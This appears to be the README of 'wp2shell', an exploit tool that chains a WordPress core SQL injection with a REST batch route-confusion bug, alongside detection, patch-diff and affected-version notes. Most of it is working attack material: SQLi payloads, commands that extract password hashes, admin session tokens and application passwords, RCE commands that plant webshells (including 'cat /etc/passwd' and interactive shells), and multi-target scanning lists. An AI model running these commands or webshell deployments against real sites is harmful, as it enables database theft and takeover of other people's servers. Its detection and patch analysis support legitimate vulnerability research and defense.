# wp2shell

**Pre-authentication SQL injection → Remote Code Execution in WordPress Core**

| | |
|---|---|
| **CVE** | `CVE-2026-63030` (batch route confusion → RCE) + `CVE-2026-60137` (WP_Query SQLi) |
| **GHSA** | [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) · [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) |
| **Discoverer** | Adam Kues — Assetnote / Searchlight Cyber |
| **Affected** | WordPress **6.9.0–6.9.4**, **7.0.0–7.0.1** (full RCE chain) · **6.8.0–6.8.5** (SQLi only, requires plugin/theme facilitated path) |
| **Patched** | **6.8.6**, **6.9.5**, **7.0.2** |
| **CVSS** | 9.8 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Python** | 3.8+ (stdlib only, zero dependencies) |

---

## Overview

Two bugs in WordPress core chain into **unauthenticated remote code execution** on
a stock install — no plugins, no authentication, no configuration required.

1. **CVE-2026-60137** — SQL injection in `WP_Query::author__not_in`.
   When the parameter is a string, the `is_array()` sanitisation guard is skipped
   and the raw value is interpolated into a `NOT IN (...)` clause.

2. **CVE-2026-63030** — Batch route confusion in `WP_REST_Server::serve_batch_request_v1()`.
   A `WP_Error` sub-request (malformed path) is pushed into `$validation[]` but not
   `$matches[]`, causing a +1 index shift. Each subsequent sub-request is dispatched
   with the **wrong** handler.

Neither bug alone is enough: the REST API sanitises `author_exclude` (schema: `array[int]`)
before it reaches `WP_Query`, and the batch endpoint rejects `GET` sub-requests
(allowlist: `POST, PUT, PATCH, DELETE`). Chaining them through a **double confusion**
bypasses both defences and reaches the SQLi unauthenticated.

### The double-confusion chain

```
┌──────────────────────────────────────────────────────────────────┐
│  OUTER batch  (POST /wp-json/batch/v1)                          │
│                                                                 │
│  [0]  path = "///"             → WP_Error, NOT in $matches      │
│  [1]  path = "/wp/v2/posts"    → carries inner batch in body    │
│       Validated as a posts request → "requests" field untouched │
│  [2]  path = "/batch/v1"       → batch handler → shifts to [1]  │
│                                                                 │
│  Outer shift: request[1] dispatched with request[2]'s handler = │
│  serve_batch_request_v1.  The batch endpoint has NO             │
│  permission_callback → fires unauthenticated.  request[1]'s     │
│  body was validated against the *posts* route, so the nested    │
│  sub-requests were NEVER checked against the batch method enum  │
│  → GET is now allowed.                                          │
├──────────────────────────────────────────────────────────────────┤
│  INNER batch  (processed inside serve_batch_request_v1)         │
│                                                                 │
│  [0]  path = "///"             → WP_Error, NOT in $matches      │
│  [1]  GET /wp/v2/users         │
│         ?author_exclude=<SQLI>  │                                │
│       Validated against users → author_exclude NOT sanitised    │
│  [2]  GET /wp/v2/posts         → get_items handler → shift      │
│                                                                 │
│  Inner shift: inner[1] dispatched with inner[2]'s handler =    │
│  WP_REST_Posts_Controller::get_items.  unsanitised string       │
│  author_exclude → author__not_in → WP_Query → SQL INJECTION     │
└──────────────────────────────────────────────────────────────────┘
```

The resulting SQL fragment:

```sql
AND wp_posts.post_author NOT IN ( 1) OR SLEEP(N)-- - )
```

`SLEEP(N)` fires once per matching post row; total delay ≈ `N × post_count` seconds.

### From SQLi to RCE

Three paths from SQL injection to code execution:

| Path | Pre-auth? | Requirements | When it works |
|------|-----------|-------------|---------------|
| **INTO OUTFILE** | Yes | MySQL `FILE` privilege, DB server filesystem = web root | LAMP stacks, shared hosting, single-server deployments |
| **Plugin upload** | No (needs creds) | SQLi → extract admin hash → offline crack → login → deploy webshell | Always (with cracked password) |
| **Recursive dispatch** | Yes | Undisclosed — original Assetnote chain, blocked by `is_dispatching()` in 6.9.5/7.0.2 | **Not publicly available** |

> **Pre-auth RCE gap:** The original discoverer (Assetnote) described a pre-auth RCE chain
> that does NOT require `FILE` privilege. The patch diff adds `is_dispatching()` guards
> in `serve_request()` and `rest_api_loaded()`, suggesting the full chain involved recursive
> REST dispatch. This path has **not been publicly disclosed**. The `probe` command maps
> admin endpoint reachability to assist research.

---

## Quick Start

```bash
# Detection only (non-destructive, no SQLi sent)
python3 wp2shell.py check http://target/

# Detection + active SQLi timing confirmation
python3 wp2shell.py check http://target/ --confirm-sqli

# Scan multiple targets from a file
python3 wp2shell.py check --targets urls.txt --confirm-sqli

# Use ?rest_route= for sites without pretty permalinks
python3 wp2shell.py check http://target/ --rest-route

# Extract database info (fast mode — X-WP-Total bitmask oracle)
python3 wp2shell.py extract http://target/ --preset fingerprint --fast

# Extract user password hashes (fast mode, ~6 requests)
python3 wp2shell.py extract http://target/ --preset users --fast

# Custom SQL query via blind extraction
python3 wp2shell.py extract http://target/ --query "SELECT user_email FROM wp_users WHERE ID=1"

# RCE via INTO OUTFILE (needs FILE privilege + DB server = web server)
python3 wp2shell.py rce http://target/ --outfile --cmd "id"

# RCE via plugin upload (needs admin credentials from cracked hash)
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id"

# Map admin endpoint reachability via route confusion
python3 wp2shell.py probe http://target/
python3 wp2shell.py probe http://target/ --confirm-sqli   # also extract DB secrets

# Proxy through Burp
python3 wp2shell.py check http://target/ --proxy http://127.0.0.1:8080
```

---

## Commands

### `check` — Non-destructive vulnerability detection

Three-phase detection, progressively more invasive:

| Phase | What | Safe? |
|-------|------|-------|
| **1. Version detection** | Checks REST API root, homepage meta tags, RSS feed, readme.html | Yes |
| **2. Marker probe** | Sends a benign batch that produces a specific 3-code error pattern (`parse_path_failed` + `block_cannot_read` + `rest_batch_not_allowed`) only when the `$matches`/`$validation` desync is present | Yes — no SQL |
| **3. Timing confirmation** (`--confirm-sqli`) | Paired baseline/delayed `SLEEP(N)` samples with median comparison | Reads no data, changes nothing |

```bash
# Single target
python3 wp2shell.py check http://target/
python3 wp2shell.py check http://target/ --confirm-sqli --sleep 3 --samples 5
python3 wp2shell.py check http://target/ --rest-route -v

# Multiple targets from file (one URL per line, # for comments)
python3 wp2shell.py check --targets targets.txt --confirm-sqli
```

Example output (vulnerable 6.9.4):

```
[*] detecting WordPress version...
[!] Version: 6.9.4 — VULNERABLE (RCE (batch confusion + SQLi))
[*] probing batch endpoint...
[*] sending marker probe (non-destructive)...
[+] route-confusion desync DETECTED (codes: block_cannot_read, parse_path_failed, rest_batch_not_allowed)
[*] SQL timing confirmation (sleep=2.0s, samples=3)...
[*]   sample 1: baseline=0.04s, delayed=2.04s
[*]   sample 2: baseline=0.03s, delayed=2.04s
[*]   sample 3: baseline=0.03s, delayed=2.03s
[*] median delta 2.01s, threshold 1.20s
[+] SQLi CONFIRMED — baseline 0.03s, injected 2.04s
```

### `extract` — Read database via blind SQLi

Two extraction modes:

| Mode | Oracle | Requests per char | Use when |
|------|--------|-------------------|----------|
| **Blind** (default) | Boolean AND — rows returned only when condition holds | ~7 (binary search) | Stable, works everywhere |
| **Fast** (`--fast`) | X-WP-Total bitmask — conditional UNION SELECT adds 0 or 1 rows; X-WP-Total header reflects this | ~0.06 (112 probes per 16 chars in 1 request) | Speed matters, large extractions |

```bash
# Fingerprint (version, user, database)
python3 wp2shell.py extract http://target/ --preset fingerprint --fast

# User password hashes
python3 wp2shell.py extract http://target/ --preset users --fast

# Custom SQL expression (blind mode)
python3 wp2shell.py extract http://target/ --query "SELECT option_value FROM wp_options WHERE option_name='siteurl'"

# With custom table prefix and max length
python3 wp2shell.py extract http://target/ --preset users --prefix wp_abc_ --max-length 256

# Extract from multiple targets
python3 wp2shell.py extract --targets targets.txt --preset fingerprint --fast
```

### `rce` — Remote code execution

Two RCE paths, one command:

```bash
# Path A: INTO OUTFILE (pre-auth, needs FILE privilege + single-server setup)
python3 wp2shell.py rce http://target/ --outfile --cmd "uname -a; id"
python3 wp2shell.py rce http://target/ --outfile --cmd "cat /etc/passwd"
python3 wp2shell.py rce http://target/ --outfile -i    # interactive shell

# Path B: plugin upload (post-auth, needs admin credentials)
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id"
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' -i
python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id" --cleanup
```

Both paths deploy **token-locked webshells** — random paths, random tokens, `hash_equals()`
token verification. The `--cleanup` flag removes the webshell plugin when finished.

**INTO OUTFILE verification:** After writing the webshell, the tool verifies it is
reachable via HTTP. If the webserver returns 404/connection error, the tool warns
that the file was likely written to the DB server's filesystem rather than the web
root — common in Docker and split-horizon hosting where the database and web server
are separate containers or machines.

Customise INTO OUTFILE paths:

```bash
python3 wp2shell.py rce http://target/ --outfile \
  --outfile-dir /var/www/html \
  --web-dir / \
  --cmd "id"
```

### `probe` — Admin endpoint mapping + secret extraction

Maps which admin-gated REST endpoints respond via route-shifted dispatch, and optionally
extracts escalation-relevant database secrets via blind SQLi.

```bash
# Map admin endpoints only
python3 wp2shell.py probe http://target/

# Map + extract DB secrets
python3 wp2shell.py probe http://target/ --confirm-sqli

# Multiple targets
python3 wp2shell.py probe --targets targets.txt
```

Probes 14 auth-gated endpoints (users, settings, plugins, themes, templates, etc.)
and extracts: admin session tokens, user activation keys, application passwords,
REST API nonce keys, and recent transients.

### `--targets` — Multi-target scanning

All commands support `--targets` / `-t` to read URLs from a file (one per line,
`#` for comments). Per-line flags `--rest-route`, `--proxy`, and `--timeout`
override the global defaults for that target only:

```bash
# targets.txt:
http://target1.com/
http://target2.com/ --rest-route
http://target3.com/ --rest-route --proxy http://127.0.0.1:8080
http://target4.com/ --timeout 60

# Usage:
python3 wp2shell.py check --targets targets.txt --confirm-sqli
python3 wp2shell.py extract --targets targets.txt --preset users --fast
python3 wp2shell.py rce --targets targets.txt --plugin --user admin --password 'pw'
python3 wp2shell.py probe --targets targets.txt
```

---

## Affected Versions

Verified by building and testing each version from the WordPress Git source
(`wordpress-develop`, tags `6.8.0` through `7.0.2`):

| Version range | CVE-2026-60137 (SQLi) | CVE-2026-63030 (route confusion) | RCE chain | Exploitable via this tool |
|---------------|----------------------|----------------------------------|-----------|--------------------------|
| ≤ 6.7.x | ❌ | ❌ | ❌ | ❌ |
| 6.8.0 – 6.8.5 | ✅ (in WP_Query) | ❌ (introduced in 6.9) | ❌ | ❌ (SQLi requires plugin/theme facilitated path) |
| 6.8.6 | ❌ (patched) | ❌ | ❌ | ❌ |
| 6.9.0 – 6.9.4 | ✅ | ✅ | ✅ | ✅ |
| 6.9.5 | ❌ (patched) | ❌ (patched) | ❌ | ❌ |
| 7.0.0 – 7.0.1 | ✅ | ✅ | ✅ | ✅ |
| 7.0.2 | ❌ (patched) | ❌ (patched) | ❌ | ❌ |

**6.8.x note:** The SQLi in `WP_Query::author__not_in` exists on all 6.8.x versions
but the batch route confusion bug was **introduced in 6.9.0** when the batch handler
was refactored. On 6.8.x, the `$matches[]` array is always appended (no off-by-one),
and the batch method allowlist correctly blocks `GET` requests. The REST API validates
`author_exclude` as `array[int]`, rejecting string input. The SQLi can only be reached
on 6.8.x through a "facilitated" path — a plugin or theme passing raw user input to
`WP_Query`. The discoverers (TF1T, dtro, haongo) independently reported this SQLi
before Assetnote chained it with 6.9.0's route confusion for pre-auth RCE.

---

## How It Works

### Detection: Marker Probe

A crafted batch request that produces a specific 3-code error pattern **only** when the
`$matches`/`$validation` desync is present:

```
[primer, POST /wp/v2/posts, POST /wp/v2/block-renderer/core/archives, POST /batch/v1]
```

| Code | Origin | Why it appears on vulnerable builds |
|------|--------|-------------------------------------|
| `parse_path_failed` | `///` primer | Malformed path always produces this |
| `block_cannot_read` | `/wp/v2/block-renderer/core/archives` | Posts request is shifted onto the block-renderer handler, which is not batch-allowed |
| `rest_batch_not_allowed` | `/batch/v1` | Block-renderer request is shifted onto the batch handler (self-call disallowed) |

All three codes appear together **only** when the arrays are misaligned. On patched builds,
the arrays stay aligned and at most `parse_path_failed` appears. On 6.8.x the
`block-renderer` route does not exist, producing `internal_server_error` instead.

### SQLi: Paired Timing Confirmation

Alternates baseline (`SLEEP(0)`) and delayed (`SLEEP(N)`) injections, taking the **median**
of paired deltas. This is robust against network jitter where a single measurement might
produce false positives or negatives. The injected value:

```
0) SELECT IF(1=1, SLEEP(N), 0)-- -
```

lands inside the query as:

```sql
AND wp_posts.post_author NOT IN ( 0) SELECT IF(1=1, SLEEP(N), 0)-- - )
```

### Extraction: Boolean Oracle

```sql
0) AND (<condition>)-- -
```

When the condition is true, `get_items()` returns rows. When false, no rows. This is a
**sleep-free** oracle — character-by-character binary search extracts data without timing
side-channels.

### Extraction: X-WP-Total Fast Mode

Two independent properties combine into a high-speed extraction technique:

1. **X-WP-Total reflects `SQL_CALC_FOUND_ROWS`** — it counts UNION rows at the SQL level
   even though PHP's `get_post()` filters them from the response body. A conditional
   `UNION SELECT` that adds 0 or 1 rows makes `X-WP-Total` a **per-bit oracle**.

2. **The inner batch has no item count limit** — the `maxItems: 25` constraint was on the
   outer batch endpoint, which is bypassed by the route confusion. The recursive
   `serve_batch_request_v1()` call iterates with no size check.

Combined: pack 7 bit-probes × 16 characters into **one** HTTP request. Each probe's
`X-WP-Total` (0 or 1) tells us whether that bit is set. An entire 34-character password
hash can be read in 2–3 requests instead of ~224.

### RCE: Token-Locked Webshells

Both RCE paths deploy webshells locked behind:

- **Random path** (`/wp-content/plugins/wp2shell_<hex>/wp2shell_<hex>.php` or `/rce/s_<hex>.php`)
- **Random 16-byte token** (verified server-side with `hash_equals()`)
- **Per-session uniqueness** — no two runs produce the same path or token

The `--cleanup` flag deletes the plugin directory after execution. Without it, the tool
prints the removal command.



## Limitations

| Constraint | Detail |
|-----------|--------|
| **Stacked queries blocked** | PHP `mysqli_query()` does not support multi-statement execution. INSERT/UPDATE/DELETE via SQLi is not possible. |
| **INTO OUTFILE filesystem** | `SELECT ... INTO OUTFILE` writes to the **DB server's** filesystem. In Docker Compose, Kubernetes, or split-horizon hosting, the DB container/machine ≠ web server — the webshell is written but unreachable. The tool now detects this and warns. |
| **Pre-auth RCE without FILE** | The original Assetnote chain (recursive REST dispatch) has not been publicly disclosed. Post-auth plugin upload is the reliable RCE path. |
| **6.8.x support** | Detection identifies 6.8.x and reports the SQLi status. The SQLi cannot be exploited directly through the REST API on 6.8.x. |
| **Pretty permalinks** | Targets without pretty permalinks must use `--rest-route`. The tool auto-detects version but cannot auto-detect permalink configuration. |

---

## Patch Diff (6.9.4 → 6.9.5)

Three changes across five files:

| File | Change | What it fixes |
|------|--------|---------------|
| `class-wp-query.php` | `wp_parse_id_list()` replaces `is_array()` + `(array)` cast | CVE-2026-60137 (SQLi) |
| `class-wp-rest-server.php` (line ~1755) | `$matches[] = $single_request;` added for WP_Error items | CVE-2026-63030 (route confusion off-by-one) |
| `class-wp-rest-server.php` (line ~286) | `is_dispatching()` guard in `serve_request()` | Prevents recursive REST dispatch (RCE hardening) |
| `rest-api.php` (line ~441) | `is_dispatching()` guard in `rest_api_loaded()` | Prevents recursive REST dispatch from starting a new cycle |
| `version.php` | Bump to 6.9.5 | — |

The `is_dispatching()` guards in **two separate files** suggest the undisclosed pre-auth
RCE chain relied on recursive REST dispatch combined with SQLi-manipulated state.

---

## Test Results

All 16 versions from 6.8.0 through 7.0.2 tested. 47 unit tests, 0 external dependencies.

| Version | Desync detected | SQLi confirmed | RCE path | Source |
|---------|----------------|----------------|----------|--------|
| 6.8.0 | ❌ | ❌ (direct REST blocked) | N/A | Docker Hub |
| 6.8.1 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.1` |
| 6.8.2 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.2` |
| 6.8.3 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.3` |
| 6.8.4 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.4` |
| 6.8.5 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.5` |
| 6.8.6 | ❌ | ❌ | ❌ | Git `6.8.6` |
| **6.9.0** | **✅** | **✅** | **✅** | Docker Hub |
| **6.9.1** | **✅** | **✅** | **✅** | Git `6.9.1` |
| **6.9.2** | **✅** | **✅** | **✅** | Git `6.9.2` |
| **6.9.3** | **✅** | **✅** | **✅** | Git `6.9.3` |
| **6.9.4** | **✅** | **✅ δ=2.00s** | **✅ plugin RCE** | Docker Hub |
| 6.9.5 | ❌ | ❌ | ❌ | Git `6.9.5` |
| **7.0.0** | **✅** | **✅** | **✅** | Docker Hub |
| **7.0.1** | **✅** | **✅ δ=2.00s** | **✅** | Docker Hub |
| 7.0.2 | ❌ | ❌ | ❌ | Git `7.0.2` |

All results match the CVE advisory. Docker Hub images: `wordpress:X.Y.Z-php8.2`.
Git versions built from `wordpress-develop` at the respective tag, files swapped
into a running 6.9.4 container and tested one by one with restore between each.

Unit tests cover: payload structure, response parsing, marker probe error codes,
blind extraction oracle, fast extraction (X-WP-Total), timing confirmation,
version detection, SQL escaping, plugin ZIP generation, route-shift dispatch,
colour output, and admin endpoint probe coverage.

```bash
python3 -m pytest test_wp2shell.py -v
# 47 passed in 0.12s
```

---

## References

- [WordPress 7.0.2 Release Announcement](https://wordpress.org/news/2026/07/wordpress-7-0-2-release/)
- [Searchlight Cyber wp2shell Advisory](https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/)
- [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) — CVE-2026-63030
- [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) — CVE-2026-60137
- [Patch diff 6.9.4 → 6.9.5](https://github.com/WordPress/wordpress-develop/compare/6.9.4...6.9.5)
- [Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) — Marker probe technique + AdminSession
- [47Cid/wp2shell-lab](https://github.com/47Cid/wp2shell-lab) — FastExtractor (X-WP-Total) + Docker lab + INTO OUTFILE

---

## License

GPL-3.0 — see [LICENSE](LICENSE).